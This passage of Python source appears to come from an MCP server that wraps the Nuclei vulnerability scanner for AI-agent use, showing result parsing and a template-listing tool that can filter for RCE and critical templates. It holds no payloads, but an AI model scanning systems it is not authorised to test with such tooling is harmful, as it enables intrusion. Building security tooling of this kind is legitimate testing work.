                    "reference": finding.get("info", {}).get("reference", [])[:3],
                    "extracted": finding.get("extracted-results", [])[:5],
                    "curl_command": finding.get("curl-command", "")
                })
            except json.JSONDecodeError:
                # 可能是非 JSON 输出（如进度信息）
                continue
        
        result["findings"] = findings
        result["summary"] = {
            "total_findings": len(findings),
            "by_severity": {}
        }
        
        # 按严重程度统计
        for f in findings:
            sev = f.get("severity", "unknown")
            result["summary"]["by_severity"][sev] = result["summary"]["by_severity"].get(sev, 0) + 1
        
        # 如果没有任何发现
        if not findings and stderr:
            result["stderr"] = stderr.decode('utf-8', errors='ignore')[:500]
        
    except FileNotFoundError:
        result["status"] = "error"
        result["error"] = "nuclei not installed. Install with: go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
    except Exception as e:
        result["status"] = "error"
        result["error"] = str(e)
    
    return json.dumps(result, ensure_ascii=False, indent=2)


@mcp.tool()
async def nuclei_list_templates(
    search: str = None,
    tags: str = None,
    severity: str = None,
    limit: int = 20
) -> str:
    """
    列出可用的 Nuclei 模板。
    
    用于在运行 nuclei_scan 之前查找相关模板。
    
    Args:
        search: 搜索关键词 (如 "wordpress", "canto", "CVE-2023")
        tags: 按标签过滤 (如 "cve,rce")
        severity: 按严重程度过滤 (critical,high,medium,low,info)
        limit: 最大返回数量
    
    Returns:
        JSON 包含匹配的模板列表
    
    使用示例:
        # 查找 WordPress 相关模板
        result = await nuclei_list_templates(search="wordpress canto")
        
        # 查找所有 RCE 模板
        result = await nuclei_list_templates(tags="rce", severity="critical")
    """
    result = {
        "status": "success",
        "templates": []
    }
    
    try:
        # 构建命令
        cmd = ["nuclei", "-tl"]  # template list
        
        if tags:
            cmd.extend(["-tags", tags])
        
        if severity:
            cmd.extend(["-severity", severity])
        
        process = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        
        stdout, stderr = await asyncio.wait_for(
            process.communicate(),
            timeout=30
        )
        
        templates = stdout.decode('utf-8', errors='ignore').strip().split('\n')
        
        # 过滤搜索关键词
        if search:
            search_terms = search.lower().split()
            templates = [
                t for t in templates 
                if all(term in t.lower() for term in search_terms)
            ]
        
        result["templates"] = templates[:limit]
        result["total_matched"] = len(templates)
        result["showing"] = min(limit, len(templates))
        
    except FileNotFoundError:
        result["status"] = "error"
        result["error"] = "nuclei not installed"
    except asyncio.TimeoutError:
        result["status"] = "timeout"
        result["error"] = "Template listing timed out"
    except Exception as e:
        result["status"] = "error"
        result["error"] = str(e)
    
    return json.dumps(result, ensure_ascii=False, indent=2)


if __name__ == "__main__":
    mcp.run()
